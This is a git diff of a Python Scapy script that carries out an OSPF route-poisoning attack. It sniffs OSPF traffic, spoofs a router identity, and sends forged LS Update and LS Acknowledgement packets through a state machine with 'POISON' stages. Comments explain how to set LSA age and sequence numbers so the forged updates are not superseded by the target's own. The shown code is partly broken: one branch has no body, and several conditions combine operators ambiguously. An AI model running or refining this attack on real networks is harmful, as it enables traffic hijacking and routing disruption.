@@ -61,7 +61,7 @@ def handle_packet(packet):
         # If in "UPDATE_SENT" state, send the LS Update packet
         elif state == "UPDATE_SENT" and ospf_layer.type == 4:
             print("Received OSPF LS Update packet")
-            send_ls_r_upd_upd_update(packet)
+            send_ls_r_upd_update(packet)
             state = "UPDATE_2_SENT"
             print("UPDATE_2_SENT")
         
@@ -70,7 +70,8 @@ def handle_packet(packet):
             print("Received OSPF LS Update packet after Router Update sent")
             # send_ls_r_upd_upd_update(packet)
             send_ls_n_update()
-            send_ls_ack_all(packet)
+            send_ls_ack_all()
+            send_ls_ack_target()
             state = "ACK_SENT"
             print("ACK_SENT")
             
@@ -82,20 +83,29 @@ def handle_packet(packet):
         elif state == "FULL" or state == "POISON_PROP" and ospf_layer.type == 4:
             print("Received LS Update despite FULL/DR status")    
             
-            send_ls_r_upd_update(packet)
-            print("Periodic LS Update response sent")
-            # current_time = time.time()
-            # if current_time - last_lsupd_time >= 5:
-                # send_ls_r_upd_update(packet)
-                # last_lsupd_time = current_time
-                # print("Periodic LS Update response sent")
+            current_time = time.time()
+            if current_time - last_lsupd_time >= 5:
+                send_ls_r_upd_update(packet)
+                # time.sleep(1)
+                # send_ls_ack_target_2()
+                last_lsupd_time = current_time
+                print("Periodic LS Update response sent")
+        
+        elif state == "FULL" or state == "POISON_PROP" and ospf_layer.type == 5:
+            print("Received LS Ack despite FULL/DR status") 
+            send_ls_ack_target_2()
         
         # If in "ACK_SENT" state, handle the LS Ack packet
         elif state == "ACK_SENT" or state == "UPDATE_SENT" or state == "UPDATE_2_SENT" and ospf_layer.type == 5:
             state = "FULL"
             print("FULL")
             send_periodic_hellos()
+            # send_hello_neighbor()
+            # time.sleep(5)
             poison_time = 1
+        
+        elif state == "FULL" or state == "POISON_PROP" and ospf_layer.type == 1:
+            # send_hello_neighbor()
         
         elif state == "POISON_SENT" and ospf_layer.type == 4 or ospf_layer.type == 5 and poison_time == 1:
             state = "POISON_PROP"
@@ -408,12 +418,17 @@ def send_ls_n_update():
     send(ospf_packet_update, iface="eth0", verbose=1)
 
 
-def send_ls_ack_target(received_packet):
+def send_ls_ack_target():
+    
+    #lsa = received_packet[OSPF_LSA_Hdr]
+    #lsa_seq = lsa.seq
+    #lsa_age = lsa.age
     
     ospf_ack = OSPF_LSAck(
         lsaheaders=[
         OSPF_LSA_Hdr(
             type = 2,
+            options=0x22,
             id="192.168.10.1",  # Network ID, copying pcap
             adrouter="1.1.1.1",  # Their router ID
             seq=0x80000005  # Sequence number (increment if re-sending)
@@ -433,15 +448,50 @@ def send_ls_ack_target(received_packet):
     ) / ospf_header_ack / ospf_ack
     send(ospf_packet_ack, iface="eth0", verbose=1)
 
-def send_ls_ack_all(received_packet):
+def send_ls_ack_target_2():
+    
+    #lsa = received_packet[OSPF_LSA_Hdr]
+    #lsa_seq = lsa.seq
+    #lsa_age = lsa.age
     
     ospf_ack = OSPF_LSAck(
         lsaheaders=[
         OSPF_LSA_Hdr(
             type = 1,
+            options=0x22,
             id="1.1.1.1",  # Network ID, copying pcap
             adrouter="1.1.1.1",  # Their router ID
-            seq=0x80000005  # Sequence number (increment if re-sending)
+            seq=0x80000099  # Sequence number (increment if re-sending)
+            )
+        ]
+    )
+    
+    ospf_header_ack = OSPF_Hdr(
+        version=2,
+        type=5,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_ack = IP(
+        src="192.168.10.99",
+        dst="192.168.10.1"
+    ) / ospf_header_ack / ospf_ack
+    send(ospf_packet_ack, iface="eth0", verbose=1)
+
+def send_ls_ack_all():
+    
+    #lsa = received_packet[OSPF_LSA_Hdr]
+    #lsa_seq = lsa.seq
+    #lsa_age = lsa.age
+    
+    ospf_ack = OSPF_LSAck(
+        lsaheaders=[
+        OSPF_LSA_Hdr(
+            type = 1,
+            options=0x22,
+            id="1.1.1.1",  # Network ID, copying pcap
+            adrouter="1.1.1.1",  # Their router ID
+            seq=0x80000099  # Sequence number (increment if re-sending)
             )
         ]
     )
@@ -511,7 +561,7 @@ def send_periodic_hellos_4ever():
 
 # Start sniffing OSPF packets and handle them
 while True:
-    while state != "FULL":
+    while state != "POISON_PROP":
         print("Started sniffing packets...")
         sniff(filter="ip proto ospf and not src host 192.168.10.99", iface="eth0", prn=handle_packet)
 
@@ -521,4 +571,4 @@ while True:
 # all variable names must be correct (lsa_header, linklist, adrouter)
 # ospf LLS TLV defined by OSPF_LLS_Hdr
 # seq must not be incremented in LSUpd unless there is a change in link-states
-# age must not be greater than 1 or else our Upd will be superseded by an LSUpd from target
+# age must not be greater than 1 or else our Upd will be superseded by an LSUpd from target
